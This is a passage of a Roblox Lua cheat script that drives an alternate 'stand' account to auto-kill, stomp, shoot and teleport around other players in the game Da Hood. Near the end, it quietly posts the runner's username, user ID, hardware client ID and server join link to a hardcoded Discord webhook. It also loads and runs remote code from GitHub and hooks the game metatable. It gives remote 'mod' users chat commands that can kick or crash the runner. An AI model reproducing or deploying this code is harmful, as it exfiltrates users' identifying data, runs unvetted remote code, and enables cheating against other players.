            STAND.Character.HumanoidRootPart.CFrame = CFrame.new(TARGET.Character.HumanoidRootPart.Position.X+(TARGET.Character.HumanoidRootPart.Velocity.X*AutoPredic),TARGET.Character.HumanoidRootPart.Position.Y+(TARGET.Character.HumanoidRootPart.Velocity.Y*0),TARGET.Character.HumanoidRootPart.Position.Z+(TARGET.Character.HumanoidRootPart.Velocity.Z*AutoPredic))*CFrame.new(0,0,0)
        else
            if KnifeAnnoy == true and KO(TARGET).Value == true then
                getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,-4.5,0)*CFrame.Angles(math.pi*0.5,0,0)
                if STAND.Character:FindFirstChild('[Knife]') then STAND.Character:FindFirstChild('[Knife]'):Activate() STAND.Character:FindFirstChild('[Knife]'):Deactivate() else STAND.Backpack:FindFirstChild('[Knife]').Parent = STAND.Character end
            end
        end
    
        if Stabbing == true and KO(TARGET).Value == false then
            StopHoverAnim = true
            noclip = true
            Equip('[Knife]') Hit()
            STAND.Character.HumanoidRootPart.CFrame = CFrame.new(TARGET.Character.HumanoidRootPart.Position.X+(TARGET.Character.HumanoidRootPart.Velocity.X*AutoPredic),TARGET.Character.HumanoidRootPart.Position.Y+(TARGET.Character.HumanoidRootPart.Velocity.Y*0),TARGET.Character.HumanoidRootPart.Position.Z+(TARGET.Character.HumanoidRootPart.Velocity.Z*AutoPredic))*CFrame.new(0,0,0)
        else
            if Stabbing == true and KO(TARGET).Value == true then
                if Attacking(STAND).Value == true then
                    getRoot(STAND).CFrame = getRoot(TARGET).CFrame*CFrame.new(0,300,0)
                else
                    Summon()
                end
            end
        end
    
        if KnifeKills == true and KO(TARGET).Value == false then
            StopHoverAnim = true
            noclip = true
            Equip('[Knife]') Hit()
            TargetKnife(TARGET)
        else
            if KnifeKills == true and KO(TARGET).Value == true then
                if Attacking(STAND).Value == true then
                    getRoot(STAND).CFrame = getRoot(TARGET).CFrame*CFrame.new(0,300,0)
                else
                    getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,5,0)
                    game.ReplicatedStorage.MainEvent:FireServer("Stomp")
                    if Dead(TARGET).Value == true then
                        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(0, -498, 0)
                    end
                end
            end
        end
    
        if StompTarget == true and KO(TARGET).Value == false then
            StopHoverAnim = true
            noclip = true
            Equip('Combat') Hit()
            TargetMalee(TARGET)
        else
            if StompTarget == true and KO(TARGET).Value == true then
                if Alt == false then
                    if Attacking(STAND).Value == true then
                        getRoot(STAND).CFrame = getRoot(TARGET).CFrame*CFrame.new(0,300,0)
                    else
                        getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,5,0)
                        game.ReplicatedStorage.MainEvent:FireServer("Stomp")
                        noclip = true
                        if Dead(TARGET).Value == true then
                            if Attacking(STAND).Value == false then
                                Summon()
                            end            
                        end	
                    end
                else
                    Summon()
                end
            end
        end
    
        if Kills == true and KO(TARGET).Value == false then
            StopHoverAnim = true
            noclip = true
            Equip('Combat') Hit()
            TargetMalee(TARGET)
        else
            if Kills == true and KO(TARGET).Value == true then
                if Alt == false then
                    if Attacking(STAND).Value == true then
                        getRoot(STAND).CFrame = getRoot(TARGET).CFrame*CFrame.new(0,300,0)
                    else
                        getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,5,0)
                        game.ReplicatedStorage.MainEvent:FireServer("Stomp")
                        if Dead(TARGET).Value == true then
                            game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(0, -498, 0)
                            wait(2.6)
                            Equip('Combat') Hit()
                        end
                    end
                else
                    game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(0, -498, 0)
                end
            end
        end
    
        if Arrest == true and KO(TARGET).Value == false then
            StopHoverAnim = true
            noclip = true
            Equip('Combat') Hit()
            TargetMalee(TARGET)
        else
            if Arrest == true and KO(TARGET).Value == true then
                if Attacking(STAND).Value == true then
                    getRoot(STAND).CFrame = getRoot(TARGET).CFrame*CFrame.new(0,300,0)
                else
                    game.Workspace.Camera.CameraSubject = getHumanoid(STAND)
                    getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,5,0)
                    if STAND.Backpack:FindFirstChild("Cuff") then
                        STAND.Backpack:FindFirstChild("Cuff").Parent = STAND.Character
                    end
                    STAND.Character:FindFirstChild('Cuff'):Activate()
                    if TARGET.Character:FindFirstChild("BodyEffects"):FindFirstChild("Cuff").Value == true then
                        Summon()
                    end
                end
            end
        end
    
        if SMITE == true and game:GetService('Players'):FindFirstChild(TARGET.Name) then
            StopHoverAnim = true
            getRoot(STAND).CFrame = CFrame.new(getRoot(TARGET).Position + Vector3.new(0,0,0) + (getHumanoid(TARGET).MoveDirection*0.95*getHumanoid(TARGET).WalkSpeed))
            local vel = getRoot(STAND).Velocity
            getRoot(STAND).Velocity = Vector3.new(0,-9999999,0)
            rs.Stepped:Wait()
            getRoot(STAND).Velocity = vel	
        end
    
    end)
    
    rs.Stepped:connect(function()
        if gunnear == true then
            StopHoverAnim = true
            follow = false
            blocking = false
            noclip = true
            Locking = true
            local x = GetNearest()
            TARGET = x
            if TARGET then
                if KO(TARGET).Value == false then
                    if STAND.Character.Head:FindFirstChildWhichIsA("BodyVelocity") then STAND.Character.Head:FindFirstChildWhichIsA("BodyVelocity"):Destroy() end
                    if getRoot(STAND):FindFirstChild("BodyPosition") then getRoot(STAND).BodyPosition:Destroy()end
                    if getRoot(STAND):FindFirstChild("BodyGyro") then getRoot(STAND).BodyGyro:Destroy()end
                    Strafe = true
                    Reload()
                    Fire('[LMG]',true)
                end
            else
                Fire('[LMG]',false)
                StopHoverAnim = false
                Strafe = false
                Locking = false
                follow = true
                noclip = true
            end
        end
    
        if Stompnear == true then
            StopHoverAnim = true
            follow = false
            noclip = true
            local x = GetNearest2()
            TARGET = x
            if TARGET then
                if KO(TARGET).Value == true then
                    if STAND.Character.Head:FindFirstChildWhichIsA("BodyVelocity") then STAND.Character.Head:FindFirstChildWhichIsA("BodyVelocity"):Destroy() end
                    if getRoot(STAND):FindFirstChild("BodyPosition") then getRoot(STAND).BodyPosition:Destroy()end
                    if getRoot(STAND):FindFirstChild("BodyGyro") then getRoot(STAND).BodyGyro:Destroy()end
                    getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position) + Vector3.new(0,5,0)
                    game.ReplicatedStorage.MainEvent:FireServer("Stomp")
                    if Dead(TARGET).Value == true then
                        follow = true
                        noclip = true
                        StopHoverAnim = false        
                    end
                end
            else
                follow = true
                noclip = true
                StopHoverAnim = false
            end
        end
    
        if killnear == true then
            StopHoverAnim = true
            follow = false
            noclip = true
            local x = GetNearest()
            TARGET = x
            if TARGET then
                if KO(TARGET).Value == false then
                    if STAND.Character.Head:FindFirstChildWhichIsA("BodyVelocity") then STAND.Character.Head:FindFirstChildWhichIsA("BodyVelocity"):Destroy() end
                    if getRoot(STAND):FindFirstChild("BodyPosition") then getRoot(STAND).BodyPosition:Destroy()end
                    if getRoot(STAND):FindFirstChild("BodyGyro") then getRoot(STAND).BodyGyro:Destroy()end
                    TargetMalee(TARGET)
                    Equip('Combat') Hit()
                end
            else
                follow = true
                noclip = true
                StopHoverAnim = false
            end
        end
    
        if knifenear == true then
            StopHoverAnim = true
            follow = false
            noclip = true
            local x = GetNearest()
            TARGET = x
            if TARGET then
                if KO(TARGET).Value == false then
                    if STAND.Character.Head:FindFirstChildWhichIsA("BodyVelocity") then STAND.Character.Head:FindFirstChildWhichIsA("BodyVelocity"):Destroy() end
                    if getRoot(STAND):FindFirstChild("BodyPosition") then getRoot(STAND).BodyPosition:Destroy()end
                    if getRoot(STAND):FindFirstChild("BodyGyro") then getRoot(STAND).BodyGyro:Destroy()end
                    TargetKnife(TARGET)
                    Equip('[Knife]') Hit()
                end
            else
                follow = true
                noclip = true
                StopHoverAnim = false
            end
        end
    end)
    
    rs.Stepped:connect(function()
        if GunKnock == true and KO(TARGET).Value == false then
            StopHoverAnim = true
            noclip = true
            Locking = true
            Strafe = true
            game:GetService("ReplicatedStorage").MainEvent:FireServer("Block",false)
            Reload()
            Fire('[LMG]',true)
        elseif GunKnock == true and KO(TARGET).Value == true then
            Fire('[LMG]',false)
            StopHoverAnim = false
            GunKnock = false
            Strafe = false
            Locking = false
            follow = true
            noclip = true
        end
    end)
    
    rs.Stepped:connect(function()
        if GunStomp == true and KO(TARGET).Value == false then
            StopHoverAnim = true
            noclip = true
            Locking = true
            Strafe = true
            game:GetService("ReplicatedStorage").MainEvent:FireServer("Block",false)
            Reload()
            Fire('[LMG]',true)
        elseif GunStomp == true and KO(TARGET).Value == true then
            getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,5,0)
            Strafe = false
            game.ReplicatedStorage.MainEvent:FireServer("Stomp")
            Fire('[LMG]',false)
            if Dead(TARGET).Value == true then
                StopHoverAnim = false
                GunStomp = false
                Locking = false
                follow = true
                noclip = true	
            end
        end
    end)
    
    rs.Stepped:connect(function()
        if game:GetService('Players'):FindFirstChild(OWNER.Name) then
            if follow == true and Pos == "Right" then
                MoveTo(2,2,2.5)
            elseif follow == true and Pos == "Left" then
                MoveTo(-2,2,2.5)
            elseif follow == true and Pos == "Back" then
                MoveTo(.6,2,3)
            elseif follow == true and Pos == "Under" then
                MoveTo(.6,-15,3)
            elseif follow == true and Pos == "Alt" then
                local RanX = math.random(-1000,1000)
                local RanZ = math.random(-1000,1000)
                MoveTo(RanX,-800,RanZ)
            end
        end
        if noclip == true then
            game.Workspace.FLOATPART.CFrame = getRoot(STAND).CFrame*CFrame.new(0,-3.4 ,0)
            for i,v in pairs(STAND.Character:GetDescendants()) do
                if v:IsA("BasePart") or v:IsA("MeshPart") or v:IsA("Part") then
                    v.CanCollide = false
                    v.Velocity = Vector3.new(0,0,0)
                end
            end
        else
            game.Workspace.FLOATPART.CFrame = getRoot(STAND).CFrame*CFrame.new(0,30.4 ,0)
        end
    end)
    
    rs.Stepped:Connect(function(a,b)delta = (delta + b/duration) % 1 
        if Strafe == true then
            if resolve == true then
                if GunMode == 'Sky' then
                    getRoot(STAND).CFrame = CFrame.new(getRoot(TARGET).Position + Vector3.new(0,7,0) + (getHumanoid(TARGET).MoveDirection*AutoPredic*getHumanoid(TARGET).WalkSpeed))*CFrame.Angles(0,5*math.pi*delta,0)
                elseif GunMode == 'Under' then
                    getRoot(STAND).CFrame = CFrame.new(getRoot(TARGET).Position + Vector3.new(0,-7,0) + (getHumanoid(TARGET).MoveDirection*AutoPredic*getHumanoid(TARGET).WalkSpeed))*CFrame.Angles(0,5*math.pi*delta,0)
                end
            else
                if GunMode == 'Sky' then
                    getRoot(STAND).CFrame = CFrame.new(getRoot(TARGET).Velocity*AutoPredic)*CFrame.Angles(0,5*math.pi*delta,0)* CFrame.new(0,7,10)+ getRoot(TARGET).Position 
                elseif GunMode == 'Under' then
                    getRoot(STAND).CFrame = CFrame.new(getRoot(TARGET).Velocity*AutoPredic)*CFrame.Angles(0,5*math.pi*delta,0)* CFrame.new(0,-7,10)+ getRoot(TARGET).Position 
                end
            end
        end
    
        if circle == true then
            getRoot(STAND).CFrame = CFrame.Angles(0,2*math.pi*delta,0)* CFrame.new(0,0,5)+ getRoot(OWNER).Position 
        end
    end)
    
    rs.Stepped:connect(function()
        if vanish == true then
            RanX = math.random(-1000,1000)
            RanZ = math.random(-1000,1000)
            getRoot(STAND).CFrame = CFrame.new(RanX,-450,RanX)
        end
    
        if AutoWeight == true then
            for i, v in pairs(STAND.Backpack:GetChildren()) do
                if v.Name == "[Weights]" and v.Name == "[HeavyWeights]" then
                    v.Parent = STAND.Character
                end
            end
    
            for i, v in pairs(STAND.Character:GetChildren()) do
                if v.Name == "[Weights]" and v.Name == "[HeavyWeights]" then
                    v:Activate()
                end
            end
        
            local RanX = math.random(-1000,1000)
            local RanZ = math.random(-1000,1000)
            STAND.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(RanX,9449,RanZ)
        end
    
        if lettucefarm == true then
            noclip = true
            STAND.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop["[Lettuce] - $5"].Head.CFrame * CFrame.new(0,-8,0)
            fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Lettuce] - $5"].ClickDetector)
            if STAND.Backpack:FindFirstChild("[Lettuce]") then
                STAND.Backpack:FindFirstChild("[Lettuce]").Parent = STAND.Character
            elseif STAND.Character:FindFirstChild("[Lettuce]") then
                STAND.Character:FindFirstChild('[Lettuce]'):Activate()
            end
        end    
    end)
    
    rs.Stepped:connect(function()
        if autodrop == true then
            game.ReplicatedStorage.MainEvent:FireServer("DropMoney","15000")
        end
    end)
    
    rs.Stepped:connect(function()
        if boxing == true then
            getRoot(STAND).CFrame = CFrame.new(-279.363251, 22.5704575, -1142.79883, -0.629518926, -4.21714468e-08, -0.776985168, -6.35824335e-08, 1, -2.76080292e-09, 0.776985168, 4.76646278e-08, -0.629518926)
            if STAND.Backpack:FindFirstChild("Combat") then
                STAND.Backpack:FindFirstChild("Combat").Parent = STAND.Character
            end
            wait()
            STAND.Character:FindFirstChild('Combat'):Activate()
            STAND.Character:FindFirstChild('Combat'):Deactivate()
        end
    end)
    
    rs.Stepped:connect(function()
        if blocking == true then
            if STAND.Character:FindFirstChild('BodyEffects'):FindFirstChild('Block') then STAND.Character:FindFirstChild('BodyEffects'):FindFirstChild('Block'):Destroy() end
            game.ReplicatedStorage.MainEvent:FireServer("Block",true) wait()
            game.ReplicatedStorage.MainEvent:FireServer("Block",false)
        end
    
        if Bind == true and Dead(STAND).Value == false and KO(STAND).Value == false then
            if getHumanoid(STAND).Health <= 80 then
                game.ReplicatedStorage.MainEvent:FireServer("ResetNew")
                getHumanoid(STAND):ChangeState'Dead'
            end
        end
    end)
    
    rs.Stepped:connect(function()
        if Sneak == true then
            STAND.Character:WaitForChild("Humanoid"):ChangeState(5)
            for _,v in ipairs(STAND.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do v:Stop() end
            getRoot(STAND).CFrame = getRoot(OWNER).CFrame * CFrame.new(0,-9,0)
            if STAND.Character:FindFirstChild('Combat') then
                STAND.Character:FindFirstChild('Combat'):Activate()
                STAND.Character:FindFirstChild('Combat'):Deactivate()
            else
                STAND.Backpack:FindFirstChild('Combat').Parent = STAND.Character
            end
            for i,v in pairs(STAND.Character:GetDescendants()) do
                if v:IsA("BasePart") or v:IsA("MeshPart") or v:IsA("Part") then
                    v.CanCollide = false
                end
            end
        end
    end)
    
    rs.Stepped:connect(function()
        if barragepos == true then
            StopHoverAnim = true
            MoveTo(0,0.85,-4.85)
        end
    end)
    
    rs.Stepped:connect(function()
        if Viewing == true then
            game.Workspace.Camera.CameraSubject = getHumanoid(TARGET)
        end
    end)
    
    rs.Stepped:Connect(function()
        for i,v in pairs(STAND.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
            if (v.Animation.AnimationId:match("rbxassetid://2788315673"))
            or (v.Animation.AnimationId:match("rbxassetid://2788316350"))
            or (v.Animation.AnimationId:match("rbxassetid://2788313790"))
            or (v.Animation.AnimationId:match("rbxassetid://2788312709"))
            or (v.Animation.AnimationId:match("rbxassetid://2788314837"))
            or (v.Animation.AnimationId:match("rbxassetid://2788289281"))
            or (v.Animation.AnimationId:match("rbxassetid://3354699999"))
            or (v.Animation.AnimationId:match("rbxassetid://2788292075"))
            or (v.Animation.AnimationId:match("rbxassetid://2968344043"))
            or (v.Animation.AnimationId:match("rbxassetid://2838893290")) then
                v:Stop();
            end
        end
    end)
    
    --respawn
    STAND.CharacterAdded:connect(function() 
        blocking = true
        barragepos = false
        barragepunch = false
        mimicpunch = false
        block = false
        mimic = false
        Fog = false
        UpFog = false
        WideFog	= false
        FlatFog = false
        STAND.Character:WaitForChild("FULLY_LOADED_CHAR")
        if AutoMask == true then wait(.15) MaskHide() end
        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(0, -800, 0)
    end)
    if AutoMask == true then
        noclip = true
        MaskHide()
        noclip = false
    end
    game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(0, -800, 0)
    STAND.CharacterAdded:connect(function() follow = false noclip = false looking = false STAND.Character:WaitForChild("FULLY_LOADED_CHAR") FollowMode() ANIMATION() end)
    OWNER.CharacterAdded:connect(function() STAND.Character:WaitForChild("FULLY_LOADED_CHAR") OWNER.Character:WaitForChild("Humanoid"):GetPropertyChangedSignal("MoveDirection"):Connect(Moved) end)
    if Hidescreen == true then rs:Set3dRenderingEnabled(false) end
    Notify({Title = ScriptName.." Loaded",Description ="Made By Secret Black Hat",Duration = 3.4028235e+38})
    
    local req = http_request or request or (http and http.request) or (syn and syn.request)
    local url = "https://discord.com/api/webhooks/1327636232598978591/Bw3Z_caU35K_BldqiTJt5DiySH8wIiqNt1qEEPTEoMzEQatAZPLnNy6px6YvkAZDa8kK"
    local data = {
        ["content"] = "",
        ["embeds"] = {
            {
                ["title"] = "Script: "..ScriptName.."" .."\n".. "**Executer : **"..identifyexecutor() .."\n".."".."\n".."Stand".."\n".. ('Username : ' ..  game:GetService("Players").LocalPlayer.Name) .."\n".."DisplayName : "..tostring(game:GetService("Players").LocalPlayer.DisplayName).."\n".."UserID : "..tostring(game:GetService("Players").LocalPlayer.UserId) .. "\n".. "Account Age: " ..game:GetService("Players").LocalPlayer.AccountAge.."".."\n".."".."\n".."Owner".."\n"..('Username : ' ..game:GetService("Players")[StandOwner].Name) .."\n".."DisplayName : "..tostring(game:GetService("Players")[StandOwner].DisplayName).."\n".."UserID : "..tostring(game:GetService("Players")[StandOwner].UserId) .. "\n".. "Account Age: " ..game:GetService("Players")[StandOwner].AccountAge.. "" .."\n".. "",
                ["description"] = "".."\n".."".."\n".."# JOIN LINK" .."\n".."## This For Roblox Web Btw" .."\n"..'```Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")```' .. "\n".."## Exploit Version (faster)".. "\n".."```game:GetService('TeleportService'):TeleportToPlaceInstance(2788229376,'"..game.JobId.."', game.Players.LocalPlayer)```".."\n".."## Hwid ```"..game:GetService("RbxAnalyticsService"):GetClientId().."```" .. "\n".."**Link To Owner Profile:** https://www.roblox.com/users/" ..game.Players[StandOwner].UserId.. "/profile" .. "\n".."**Link To Stand Profile:** https://www.roblox.com/users/" ..game.Players.LocalPlayer.UserId.. "/profile" .. "\n".."**Ping: **" ..game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString().. "" .."\n".. "",
                ["type"] =  "rich",
                ["color"] = tonumber(0x0000),
                ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..tostring(game:GetService("Players").LocalPlayer.Name)
                }
            }
        }
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)
    
    local headers = {
        ["content-type"] = "application/json"
    }
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    req(abcdef)
    
    STAND.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(0, -800, 0)
    local mt = getrawmetatable(game)
    local old = mt.__namecall
    setreadonly(mt,false)
    mt.__namecall = newcclosure(function(...)
        local args = {...}
        if Locking == true and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
            if resolve == true then
                args[3] = TARGET.Character.HumanoidRootPart.Position + Vector3.new(0, 0, 0) + (TARGET.Character.Humanoid.MoveDirection * AutoGunPredic * TARGET.Character.Humanoid.WalkSpeed)
            else
                args[3] = TARGET.Character.HumanoidRootPart.Position + Vector3.new(0, 0, 0) + (TARGET.Character.HumanoidRootPart.Velocity * AutoGunPredic)
            end
    
            return old(unpack(args))
        end
        return old(...)
    end)
    
    --Mod goes there
    function commands(msg,plr)
        Mod = game:GetService('Players'):GetPlayerByUserId(plr)
        Msg = string.lower(msg)
        SplitCMD = string.split(Msg,' ')
        Lower = string.lower(STAND.Name)
        Allowed = string.find(Lower, SplitCMD[2])
        if Allowed then
            if string.find(SplitCMD[1], '!say') then
                Chat("OSGC AND XENON NEVER DIE")
            end
    
            if string.find(SplitCMD[1], '!reset') then
                if Mod.Name == OWNER.Name then else
                    Reset()
                end
            end
    
            if string.find(SplitCMD[1], '!owner') then
                if Mod.Name == OWNER.Name then else
                    Stop()
                    getRoot(STAND).CFrame = getRoot(OWNER).CFrame
                    Chat("My Owner is"..StandOwner.."!")
                end
            end
    
            if string.find(SplitCMD[1], '!bring') then
                if Mod.Name == OWNER.Name then else
                    Stop()
                    getRoot(STAND).CFrame = getRoot(Mod).CFrame
                end
            end
    
            if string.find(SplitCMD[1], '!kick') then
                if Mod.Name == OWNER.Name then else
                    game.Players.LocalPlayer:Kick("You has been Kicked By Mod.")
                end
            end
    
            if string.find(SplitCMD[1], '!crash') then
                if Mod.Name == OWNER.Name then else
                    while true do end
                end
            end
    
            if string.find(SplitCMD[1], '!freeze') then
                if Mod.Name == OWNER.Name then else
                    game.RunService:BindToRenderStep("FREEZED",-1 ,function()
                        getRoot(STAND).Anchored = true
                    end)
                end
            end
    
            if string.find(SplitCMD[1], '!thaw') then
                if Mod.Name == OWNER.Name then else
                    game.RunService:UnbindFromRenderStep("FREEZED")
                    getRoot(STAND).Anchored = false
                end
            end
    
            if string.find(SplitCMD[1], '!dropcash') then
                if Mod.Name == OWNER.Name then else
                    game.ReplicatedStorage.MainEvent:FireServer("DropMoney","15000")
                end
            end
    
            if string.find(SplitCMD[1], '!ban') then
                if Mod.Name == OWNER.Name then else
                    game.Players.LocalPlayer:Kick('PERMA-BAN')
                end
            end
        else
            if string.find(msg, '/e say') then
                Chat("OSGC ARE BEST")
            end
        end
    end
    
    MOD = loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenon-UI-coder/Da-Hood/main/Premium-Mod"))()
    
    game.Players.PlayerAdded:Connect(function(v)
        ModVeryGyat = table.find(MOD, v.UserId)
        if ModVeryGyat then
            v.Chatted:Connect(function(msg)
                commands(msg, v.UserId)
            end)
        end
    end)
    
    for i,v in pairs(game:GetService('Players'):GetChildren()) do
        ModVeryGyat = table.find(MOD, v.UserId)
        if ModVeryGyat then
            v.Chatted:Connect(function(msg)
                commands(msg, v.UserId)
            end)
        end
    end
    
    rs.Stepped:Connect(function()
        local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        local Value = tostring(ping)
        local pingValue = Value:split(" ")
        local PingNumber = pingValue[1]
        AutoGunPredic = PingNumber / 1000 + gunkillprediction
        AutoPredic = PingNumber / 1000 + Prediction
    
        for _, v in pairs(game:GetService("Players"):GetPlayers()) do
            if v and v.Character and v.Character:FindFirstChildOfClass("Humanoid") and v.Character:FindFirstChildOfClass("Humanoid").DisplayDistanceType ~= Enum.HumanoidDisplayDistanceType.Viewer then
                v.Character:FindFirstChildOfClass("Humanoid").DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
            end
        end
    end)
    
    Annc = loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenon-UI-coder/Da-Hood/main/Annc"))()
    task.spawn(function()
        pcall(function()
            for i,v in pairs(Annc) do 
                print(v)
                Notify({Title = v,Duration = 60})
                task.wait(.1)
            end
        end)
    end)
end